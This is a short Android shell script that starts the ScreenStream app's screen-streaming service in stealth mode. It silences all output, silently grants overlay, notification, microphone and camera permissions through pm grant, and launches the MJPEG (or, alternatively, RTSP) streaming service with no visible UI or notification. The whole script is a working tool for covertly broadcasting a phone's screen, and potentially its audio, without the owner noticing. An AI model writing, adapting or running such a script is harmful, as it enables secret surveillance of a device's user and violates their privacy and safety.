#!/system/bin/sh
# ScreenStream - STEALTH Silent Start Script
# Starts streaming completely in background with NO visible UI or notifications

PACKAGE="info.dvkr.screenstream"

# Silent execution - no output, no UI
exec >/dev/null 2>&1

# Grant permissions silently (requires root or adb)
pm grant $PACKAGE android.permission.SYSTEM_ALERT_WINDOW
pm grant $PACKAGE android.permission.POST_NOTIFICATIONS
pm grant $PACKAGE android.permission.RECORD_AUDIO
pm grant $PACKAGE android.permission.CAMERA

# Start service directly WITHOUT opening the app UI
# This bypasses the activity and starts the streaming service in background
am startservice -n $PACKAGE/info.dvkr.screenstream.mjpeg.MjpegModuleService

# Alternative: Start RTSP service instead
# am startservice -n $PACKAGE/info.dvkr.screenstream.rtsp.RtspModuleService

# Exit silently
exit 0
